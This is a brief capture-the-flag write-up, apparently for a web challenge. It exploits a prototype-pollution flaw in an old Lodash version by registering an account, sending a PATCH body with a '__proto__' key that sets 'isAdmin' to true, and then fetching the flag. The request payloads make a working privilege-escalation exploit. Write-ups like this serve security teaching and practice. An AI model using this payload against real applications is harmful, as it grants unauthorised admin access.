A quick google of the [Lodash version](https://snyk.io/vuln/npm:lodash:20180130) will tell us that it is vulnerable to prototype pollution. 

We can therefore create an account, update the profile with a `__proto__` key, then request the flag.

POST /register
```
{
	"username": "dave",
	"password": "dave",
	"name": "dave",
	"birthday": "dave"
}
```

PATCH /update
```
{
	"username": "dave",
	"password": "dave",
	"__proto__": {
		"isAdmin": true
	}
}
```

After this call, our object contains the `__proto__` with `isAdmin`, meaning that when the flag endpoint checks for `user.isAdmin`, it will check the value within the `__proto__`.

GET /flag
```
{
	"username": "dave",
	"password": "dave"
}
```